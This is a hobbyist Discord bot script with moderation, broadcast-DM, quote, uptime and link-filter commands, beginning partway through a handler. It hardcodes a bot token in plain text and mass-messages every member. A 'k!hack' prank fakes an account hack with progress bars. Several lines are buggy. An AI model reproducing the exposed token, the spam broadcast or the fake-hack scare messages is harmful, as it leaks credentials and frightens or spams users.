  if (!msg.content.startsWith(prefix)) return;
  let command = msg.content.split(" ")[0];
  command = command.slice(prefix.length);
  let args = msg.content.split(" ").slice(1);

    if(command === "0") {
        const emoji = client.emojis.find("name", "wastebasket")
    let textxt = args.slice(0).join("");
    if(msg.member.hasPermission("MANAGE_MESSAGES")) {
    if (textxt == "") {
        msg.delete().then
    msg.channel.send("***```but any number of messeges u want to remove ??```***").then(m => m.delete(3000));
} else {
    msg.delete().then
    msg.delete().then
    msg.channel.bulkDelete(textxt);
        msg.channel.send("```php\ndone i removed: " + textxt + "\n```").then(m => m.delete(3000));
        }    
    }
}
});



client.on('ready',  () => {
  console.log('By : Mark');
  console.log(`Logged in as * [ " ${client.user.username} " ] servers! [ " ${client.guilds.size} " ]`);
  console.log(`Logged in as * [ " ${client.user.username} " ] Users! [ " ${client.users.size} " ]`);
  console.log(`Logged in as * [ " ${client.user.username} " ] channels! [ " ${client.channels.size} " ]`);
});
client.on('message', message => {
    if(message.content == '||active') {
    const embed = new Discord.RichEmbed()
    .setDescription(`**Members info🔋
:green_heart: online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}
:heart:dnd:       ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}
:yellow_heart: idle:      ${message.guild.members.filter(m=>m.presence.status == 'idle').size}   
:black_heart: offline:   ${message.guild.members.filter(m=>m.presence.status == 'offline').size} 
:blue_heart:   all:  ${message.guild.memberCount}**`)         
         message.channel.send({embed});

    }
  });
client.on('message', message => {
   let embed = new Discord.RichEmbed()

    let args = message.content.split(' ').slice(1).join(' ');
     if(!message.channel.guild) return;
if(message.content.split(' ')[0] == '||bc') {
         message.react("✔️")
          let embed = new Discord.RichEmbed()
    .setColor("#FF00FF")
    .setThumbnail(message.author.avatarURL)   
                                      .addField('تم الارسال بواسطة :', "<@" + message.author.id + ">")
                 message.channel.sendEmbed(embed);
        message.guild.members.forEach(m => {
            var bc = new Discord.RichEmbed()
.addField('**● Sender  :**', `*** → ${message.author.username}#${message.author.discriminator}***`)
            .addField('***● Server  :***', `*** → ${message.guild.name}***`)               
    .setColor('#ff0000')
                 .addField('ّ', args)
            m.send(``,{embed: bc});
        });
    }
})

client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('discord.gg')){
      if(!message.member.hasPermission('ADMINISTRATOR'))
        message.delete()
    return message.reply(`** يمنع نشر الروابط ! **`)
    }
});
client.on('message', message => {
     if (message.content === "servers") {
     let embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .addField("**Servers: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
});
client.on('message', message => {
if (message.content === "||help") {
message.reply("**Done**")
message.reply("**Bot commands have been sent in your**")
message.react("📩")

}
});

client.on('ready', () => {
   console.log(`----------------`);
      console.log(`Bot HS!!! -By Mark`);
        console.log(`----------------`);
      console.log(`Bot HS!!! -By Mark ' `);
    console.log(`----------------`);
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(` Prefix ( ||help )- The bot by Mark`,"http://twitch.tv/S-F")
client.user.setStatus("dnd")
});
client.on("guildCreate", guild => {
  console.log(` Join Bot Of Server ${guild.name} Owner Of Server ${guild.owner.user.username}!`)
});
const secreT = [
  "**الحياة بكل ما فيها تقف دائمًا على حد الوسطية بين اتزان المعنى وضده من حب وكره وحق وباطل وعدل وظلم**.",
  "**كى تعيش عليك ان تتقن فن التجاهل باحتراف**.",
  "**لا تحزن على من اشعرك بان طيبتك غباء امام وقاحته**.",
  "**هناك من يحلم بالنجاح وهناك من يستيقظ باكرا لتحقيقه**.",
  "**ان تعالج ألمك بنفسك تلك هى القوة**.", 
  "**الجميع يسمع ما تقول والاصدقاء ينصتون لما تقول وافضل الاصدقاء ينصتون لما اخفاه سكوتك**.", 
  "**انتهى زمن الفروسية ، لم تنقرض الخيول بل انقرض الفرسان**.", 
  "**ان تكون اخرسا عاقلا خير من ان تكون نطوقا جهولا**.", 
  "**المناقشات العقيمة لا تنجب افكارا**.", 
  "**نحن نكتب ما لا نستطيع ان نقول وما نريد ان يكون**.", 
  "**نحن نكتب ما لا نستطيع ان نقول وما نريد ان يكون**.", 
]
 client.on('message', message => {
   if (message.content.startsWith("خواطر")) {
                if(!message.channel.guild) return message.reply('** This command only for servers**');
  var embed = new Discord.RichEmbed()
  .setColor('RANDOM')
   .setThumbnail(message.author.avatarURL) 
 .addField('Desert Bot' ,
  `${secreT[Math.floor(Math.random() * secreT.length)]}`)
  message.channel.sendEmbed(embed);
  console.log('[id] Send By: ' + message.author.username)
    }
});

client.on('message', message => {
    if (message.content.startsWith("k!hack")) {
        if(!message.author.id === '') return;
      if (message.author.bot) return
           message.delete();
             let args = message.content.split(' ').slice(1);
 
                   let virusname = args.join(' ');
                 if (virusname < 1) {
                     return message.channel.send("```اكتب اسم الشخص الي تبي يتهكر```");
                 }
                 message.channel.send({embed: new Discord.RichEmbed().setTitle('Loading ' + virusname + "...").setColor(0xFF0000)}).then(function(m) {
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading  [▓ ] 1%').setColor(0xFF0000)})
             }, 1000)
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord  [▓▓ ] 2%').setColor(0xFF0000)})
             }, 2000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓ ] 3%').setColor(0xFF0000)})
             }, 3000)
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading  hack [▓▓▓▓ ] 4%').setColor(0xFF0000)})
             }, 4000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading  FUCK [▓▓▓▓▓▓▓▓▓▓▓▓ ] 28%').setColor(0xFF0000)})
             }, 5000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading hack Account Information [▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 35%').setColor(0xFF0000)})
             }, 6000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: will fuck your Account [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 78%').setColor(0xFF0000)})
             }, 7000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading  fuck Account [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 80%').setColor(0xFF0000)})
             }, 8000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 86%').setColor(0xFF0000)})
             }, 9000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 89%').setColor(0xFF0000)})
             }, 10000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 90%').setColor(0xFF0000)})
             }, 11000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading fuck Account  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 95%').setColor(0xFF0000)})
             }, 12000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 96%').setColor(0xFF0000)})
             }, 13000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 97%').setColor(0xFF0000)})
             }, 14000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Loading Discord Virus [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 98%').setColor(0xFF0000)})
             }, 15000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: fuck you   [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓���▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 99%').setColor(0xFF0000)})
             }, 16000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']:   you are done [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%').setColor(0xFF0000)})
             }, 17000)
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']:' + virusname + 'done it\'s going good 100.9%').setColor(0xFF0000)})
             }, 18000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']:  I am done').setColor(0xFF0000)})
             }, 19000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: uploading data' + virusname + ".key").setColor(0xFF0000)})
             }, 22000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 5...').setColor(0xFF0000)})
             }, 25000)
               setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 4...').setColor(0xFF0000)})
             }, 26000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 3...').setColor(0xFF0000)})
             }, 27000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 2...').setColor(0xFF0000)})
             }, 28000)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: Uploaded! Initiating explosion in 1...').setColor(0xFF0000)})
             }, 29000)
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 99%').setColor(0xFF0000)})
           }, 30000)
              setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓]100%  Finished').setColor(0xFF0000)})
           }, 31000)
              setTimeout(function() {
               m.delete()
           }, 32000)
             setTimeout(function() {
    		  
			  message.channel.send('```يتم التهكير```')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('```يتم اكتمال معلومات حسابك```')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('```""تم""```')
			  message.channel.send('``|``')
		      message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('```يتم التهكير```')
			   message.channel.send('``|``')
			   message.channel.send('``|``')
			   message.channel.send('``|``')			   
			  message.channel.send('```يتم تهكير حسابك```') 
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
              message.channel.send('```""تم""```')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('ّّّ```تم تهكير حسابك بنجاح```')
              message.channel.send('``|``') 
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('```I have signed in de```')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
              message.channel.send('```I have all your information```')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
			  message.channel.send('``|``')
              message.channel.send('```finish hack```')



           }, 33000)
           });
         }
 })
 
 client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('gmail')){
        message.delete()
    return message.reply(`** لايمكنك نشر الجيمل  هنا **`)
    }
});

client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('snapchat')){
        message.delete()
    return message.reply(`** لايمكنك نشر سناب شات  هنا **`)
    }
});


client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('instagram')){
        message.delete()
    return message.reply(`** لايمكنك نشر الانستقرام هنا **`)
    }
});


client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('twitter')){
        message.delete()
    return message.reply(`** لايمكنك  نشر التويتر هنا **`)
    }
});


client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('facebook')){
        message.delete()
    return message.reply(`** لايمكنك نشر الفيس بوك هنا **`)
    }
});



client.on('message', message => {
    var args = message.content.split(/[ ]+/)
    if(message.content.includes('youtube')){
        message.delete()
    return message.reply(`** لايمكنك نشر اروابط في هذا اسرفر **`)
    }

});

client.on('ready', function(){
    var ms = 10000 ;
    var setGame = [`||help ${client.guilds.size} Servers`,`||help Users ${client.users.size}` ,  "website https://on-bot.weebly.com/ "];
    var i = -1;
    var j = 0;
    setInterval(function (){
        if( i == -1 ){
            j = 1;
        }
        if( i == (setGame.length)-1 ){
            j = -1;
        }
        i = i+j;
        client.user.setGame(setGame[i],`mwww.twitch.tv/mark`);
    }, ms);

});




client.on('message', message => {
if (message.content.startsWith(prefix + "uptime")) {
    let uptime = client.uptime;

    let days = 0;
    let hours = 0;
    let minutes = 0;
    let seconds = 0;
    let notCompleted = true;

    while (notCompleted) {

        if (uptime >= 8.64e+7) {

            days++;
            uptime -= 8.64e+7;

        } else if (uptime >= 3.6e+6) {

            hours++;
            uptime -= 3.6e+6;

        } else if (uptime >= 60000) {

            minutes++;
            uptime -= 60000;

        } else if (uptime >= 1000) {
            seconds++;
            uptime -= 1000;

        }

        if (uptime < 1000)  notCompleted = false;

    }

    message.channel.send("`" + `${days} days, ${hours} hrs, ${minutes} min , ${seconds} sec` + "`");


}
});

client.on('message', function(message) {
    if (message.channel.type === "dm") {
        if (message.author.id === client.user.id) return;
        var iiMo = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setTimestamp()
        .setTitle('``I have received a new DM !``')
        .setThumbnail(`${message.author.avatarURL}`)
        .setDescription(`\n\n\`\`\`${message.content}\`\`\``)
        .setFooter(`From **${message.author.tag} (${message.author.id})**`)
    client.channels.get("id the channel").send({embed:iiMo});
    }
});


client.on('message', message => {
   if (message.content.startsWith("id")) {
                if(!message.channel.guild) return message.reply('** This command only for servers**');

               var mentionned = message.mentions.users.first();
    var mentionavatar;
      if(mentionned){
          var mentionavatar = mentionned;
      } else {
          var mentionavatar = message.author;
          
      }
   let embed = new Discord.RichEmbed()
  .setColor("RANDOM")
   .setThumbnail(`${mentionavatar.avatarURL}`)
  .addField("Name:",`<@` + `${mentionavatar.id}` + `>`, true)
  .addField('Discrim:',"#" +  `${mentionavatar.discriminator}`, true)
   .addField("ID:", "**[" + `${mentionavatar.id}` + "]**", true)
  .addField("Create At:", "**[" + `${mentionavatar.createdAt}` + "]**", true)
     
     
  message.channel.sendEmbed(embed);
  console.log('[id] Send By: ' + message.author.username)
    }
});


client.on('message', message => {
    if (message.content.startsWith("||myinv")) {
    message.guild.fetchInvites()
    .then(invites => message.channel.send(`انت جبت   ${invites.find(invite => invite.inviter.id === message.author.id).uses} عضو لهاذا السيرفر`))
     
    }
});







client.login("NDM1NDQ0NDk3MDU3MzE2ODY0.DbaLNw.-tWBVT_N6qlFsbp8eL8qNes2gNI");

















client.login(process.env.BOT_TOKEN);
